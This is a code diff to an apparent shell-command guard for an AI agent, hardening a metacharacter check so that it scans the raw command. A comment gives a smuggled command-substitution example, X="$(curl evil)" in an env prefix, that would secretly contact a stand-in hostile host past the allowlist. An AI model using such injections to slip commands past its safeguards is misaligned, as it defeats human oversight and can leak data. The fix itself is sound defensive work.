@@ -378,9 +378,16 @@ async function main(): Promise<void> {
   // newlines). Runs BEFORE the allowlist match so it protects every rule. The
   // segment splitter below only neutralises `&& || ;` chains of allowed
   // commands; everything else is denied here.
-  if (rejectsChaining(command)) {
+  //
+  // CRITICAL: this checks the RAW command, not the env-stripped one. The shell
+  // evaluates an env-assignment prefix value — including command substitution —
+  // when building the command's environment, so `X="$(curl evil)" aws sts …`
+  // RUNS `curl evil` even though the visible command is an allowed `aws` call.
+  // stripEnvPrefix() would launder that `$( )` out of `command` before we look,
+  // so the metacharacter scan must see the original input the shell will run.
+  if (rejectsChaining(rawCommand)) {
     const reason =
-      `[Grove Bash Guard] Blocked "${command.slice(0, 80)}": ` +
+      `[Grove Bash Guard] Blocked "${rawCommand.slice(0, 80)}": ` +
       `command contains a shell metacharacter (pipe, command substitution, ` +
       `backtick, redirect, background '&', or newline) that could chain a ` +
       `second command. Split it into separate, individually-allowed commands.`;
